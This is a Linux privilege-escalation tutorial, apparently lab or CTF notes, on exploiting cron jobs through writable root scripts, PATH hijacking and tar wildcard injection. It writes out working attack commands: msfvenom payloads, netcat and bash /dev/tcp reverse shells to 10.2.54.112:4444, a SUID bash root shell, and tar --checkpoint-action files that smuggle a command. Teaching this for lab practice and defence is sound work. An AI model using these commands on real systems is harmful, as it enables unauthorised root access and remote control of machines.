The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as one-time events or as recurring tasks. You can create a crontab file containing commands and instructions for the Cron daemon to execute.
### How to view what Cronjobs are active.
We can use the command `cat /etc/crontab` to view what cron jobs are scheduled. This is something you should always check manually whenever you get a chance, especially if LinEnum, linepeas, or a similar script, doesn't find anything.
### Format of a Cronjob

Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 

	# = ID  , m = Minute, h = Hour, dom = Day of the month, mon = Month

	dow = Day of the week, user = What user the command will run as,command = What    command should be run

	For Example, #  m   h dom mon dow user  command 

	 17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly
# Exploiting Crontab

### Method 1: File Permissions

First we either look at the output of LinEnum, linpeas output or we use `cat /etc/crontab` to view what cron jobs are scheduled.

Then, lets suppose we found a script that runs every couple of minutes (lets say 5 mins) as a root user, so we can replace the script inside it with a reverse shell payload, which could be easily generated by using the following command:

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=10.2.54.112 lport=4444 R
```

which will generate the following payload that we will paste in the cronjob file:

```bash
mkfifo /tmp/eyxkvh; nc 10.2.54.112 4444 0</tmp/eyxkvh | /bin/sh >/tmp/eyxkvh 2>&1; rm /tmp/eyxkvh
```

Or we can use:

```bash
 #!/bin/bash  
 bash -i >& /dev/tcp/10.2.54.112/4444 0>&1
```

Now what we have to do is open a netcat listener on our machine waiting for the reverse shell payload to run after the scheduled time, using this command: 

```bash
nc -lvnp 4444
```
### Method 2: PATH Environment Variable

Lets suppose we view the `/etc/crontab` file and we found that PATH starts with `/home/user` for example.

So we can either offer a shell using one of the previous payloads like 

```bash
#!/bin/bash  
 bash -i >& /dev/tcp/10.2.54.112/4444 0>&1
```

or the msfvenom payload.

Or we can make the root make a SUID binary bash file for us, and we just have to run the SUID file from our use it to execute a root shell like so:

First we copy this script to a file with the same name of a cronjob, and we copy the file to a folder that is part of the crontab PATH:

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
```

Now we make it executable:

```bash
chmod +x /home/user/overwrite.sh
```

and finally we run it with the following command:

```bash
/tmp/rootbash -p
```

**Note:** The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.
### Method 3: Wildcards

Lets suppose we view the `/etc/crontab` file and we found that one of the cronjobs starts has the following content:

```bash
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

We can see that we have a wildcard symbol which means we include all the files that we have in `/home/user`, but how would this help us to exploit the target machine?

First, we generate a reverse shell ELF binary like so:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.2.54.112 LPORT=4444 -f elf -o shell.elf
```

then we transfer the file to `/home/user ` dir and we use this command to make the output file executable:

```bash
chmod +x /home/user/shell.elf
```

Now we make a these two files, and this will trick the tar to use these files as command options!

```bash
touch /home/user/--checkpoint=1  
touch /home/user/--checkpoint-action=exec=shell.elf
```

Finally we open a netcat listener and we wait for the cronjob to run:

```bash
nc -nvlp 4444
```